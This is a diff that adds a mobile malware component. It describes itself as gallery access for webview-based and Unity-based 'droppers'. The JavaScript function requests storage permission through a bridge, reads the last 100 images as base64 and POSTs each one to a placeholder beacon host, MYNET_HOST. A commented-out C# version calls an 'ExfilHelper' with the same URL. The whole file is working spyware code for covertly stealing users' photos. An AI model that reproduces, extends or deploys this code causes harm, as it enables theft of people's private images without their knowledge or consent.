@@ -1,0 +1,40 @@
+/**
+ * PHONE-SIDE JSBRIDGE / MONO GALLERY ACCESS
+ * This script provides low-level access to the mobile gallery via a JSBridge (for webview-based droppers)
+ * or Mono (for Unity-based droppers).
+ */
+
+// --- JSBRIDGE VERSION (For Hybrid Apps) ---
+function exfiltrateGalleryJS() {
+    console.log("Exfiltrating gallery via JSBridge...");
+    
+    // Request permissions via Bridge
+    MobileBridge.requestPermission("android.permission.READ_EXTERNAL_STORAGE", (granted) => {
+        if (!granted) return;
+
+        // Fetch last 100 images
+        MobileBridge.fetchMediaItems({ type: "image", limit: 100 }, (items) => {
+            items.forEach(item => {
+                MobileBridge.readFileBase64(item.path, (data) => {
+                    // Beacon to MyNet
+                    fetch("http://MYNET_HOST:80/api/beacon", {
+                        method: "POST",
+                        body: "data=" + encodeURIComponent(data)
+                    });
+                });
+            });
+        });
+    });
+}
+
+// --- MONO / C# VERSION (For Native Droppers) ---
+/*
+public void ExfiltrateMono() {
+    AndroidJavaClass contextClass = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
+    AndroidJavaObject currentActivity = contextClass.GetStatic<AndroidJavaObject>("currentActivity");
+    
+    // Call custom native helper if available
+    AndroidJavaObject exfilHelper = new AndroidJavaObject("com.mynet.ExfilHelper");
+    exfilHelper.Call("startExfiltration", currentActivity, "http://MYNET_HOST/api/beacon");
+}
+*/
